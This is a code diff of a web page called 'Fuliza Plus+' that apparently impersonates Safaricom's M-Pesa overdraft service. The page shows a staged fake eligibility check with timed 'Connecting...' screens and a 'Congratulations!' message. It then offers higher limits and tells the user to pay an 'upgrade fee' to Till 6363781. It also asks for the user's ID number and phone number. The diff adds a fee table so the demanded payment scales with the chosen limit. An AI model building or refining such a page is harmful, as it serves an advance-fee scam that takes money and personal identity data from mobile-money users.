@@ -23,8 +23,6 @@ body {
   box-shadow: 0 5px 20px rgba(0,0,0,0.1);
 }
 
-h2 { margin: 10px 0; }
-
 button {
   padding: 15px;
   border-radius: 12px;
@@ -78,6 +76,12 @@ button {
   background: #e8f5e9;
 }
 
+.fee {
+  font-size: 12px;
+  color: #555;
+  margin-top: 5px;
+}
+
 .modal {
   position: fixed;
   top:0; left:0;
@@ -117,7 +121,7 @@ button {
 
 <div id="app"></div>
 
-<!-- PAYMENT MODAL -->
+<!-- MODAL -->
 <div class="modal" id="modal">
   <div class="modal-content">
     <div class="modal-header">
@@ -125,15 +129,13 @@ button {
       <h3 id="modalTitle"></h3>
     </div>
     <div class="modal-body">
-      <div class="info">
-        Enter your Safaricom number. Pay to Till Number <b>6363781</b> to proceed.
-      </div>
+      <div class="info" id="modalFee"></div>
 
       <input class="input" placeholder="ID Number">
-      <input class="input" id="phone" value="0704343709">
+      <input class="input" value="0704343709">
 
       <button onclick="closeModal()">Cancel</button>
-      <button class="green" onclick="pay()">Pay</button>
+      <button class="green" id="payBtn">Pay</button>
     </div>
   </div>
 </div>
@@ -142,21 +144,39 @@ button {
 let step = 1;
 let selectedAmount = 3000;
 
-function render() {
+const limits = [
+  {amount:3000, fee:250},
+  {amount:5000, fee:293},
+  {amount:7500, fee:350},
+  {amount:10000, fee:500},
+  {amount:12500, fee:747},
+  {amount:16000, fee:898},
+  {amount:21000, fee:1015},
+  {amount:25500, fee:1220},
+  {amount:30000, fee:1533},
+  {amount:35000, fee:1730},
+  {amount:45000, fee:2000},
+  {amount:60000, fee:2250},
+  {amount:70000, fee:2500}
+];
+
+function getFee(amount){
+  return limits.find(l => l.amount === amount).fee;
+}
+
+function render(){
   const app = document.getElementById("app");
 
-  // STEP 1
   if(step === 1){
     app.innerHTML = `
     <div class="card">
       <h2>Fuliza Plus+</h2>
-      <p>Verify your identity to unlock higher limits</p>
+      <p>Verify your identity</p>
       <input class="input" placeholder="Enter M-Pesa Number">
       <button class="green" onclick="next()">Check My Eligibility</button>
     </div>`;
   }
 
-  // STEP 2-5 LOADING
   if(step >=2 && step <=5){
     const texts = [
       "Connecting...",
@@ -173,31 +193,29 @@ function render() {
     setTimeout(()=>{ step++; render(); }, 1500);
   }
 
-  // STEP 6 SUCCESS
   if(step === 6){
     app.innerHTML = `
     <div class="card">
       <h2>✅ Congratulations!</h2>
-      <p>High Trust Score Detected.</p>
       <button class="dark" onclick="next()">Proceed to Upgrade Limit</button>
     </div>`;
   }
 
-  // STEP 7 LIMITS
   if(step === 7){
-    const amounts = [3000,5000,7500,10000,12500,16000,21000,25500,30000,35000,45000,60000,70000];
-
     app.innerHTML = `
     <div class="card">
       <h2>Select Your Limit</h2>
       <div class="grid">
-        ${amounts.map(a=>`
-          <div class="box ${a===selectedAmount?'active':''}" onclick="select(${a})">
-            Ksh ${a}
+        ${limits.map(l=>`
+          <div class="box ${l.amount===selectedAmount?'active':''}" onclick="select(${l.amount})">
+            <strong>Ksh ${l.amount}</strong>
+            <div class="fee">Fee: Ksh ${l.fee}</div>
           </div>
         `).join("")}
       </div>
-      <button class="green" onclick="openModal()">UPGRADE TO Ksh ${selectedAmount}</button>
+      <button class="green" onclick="openModal()">
+        UPGRADE TO Ksh ${selectedAmount}
+      </button>
     </div>`;
   }
 }
@@ -213,17 +231,21 @@ function select(a){
 }
 
 function openModal(){
+  const fee = getFee(selectedAmount);
+
   document.getElementById("modal").style.display = "flex";
   document.getElementById("modalTitle").innerText =
     "Limit will be boosted to Ksh " + selectedAmount;
+
+  document.getElementById("modalFee").innerHTML =
+    `Pay <b>Ksh ${fee}</b> to Till <b>6363781</b> to proceed.`;
+
+  document.getElementById("payBtn").innerText =
+    "Pay Ksh " + fee;
 }
 
 function closeModal(){
   document.getElementById("modal").style.display = "none";
-}
-
-function pay(){
-  alert("Processing payment...");
 }
 
 render();
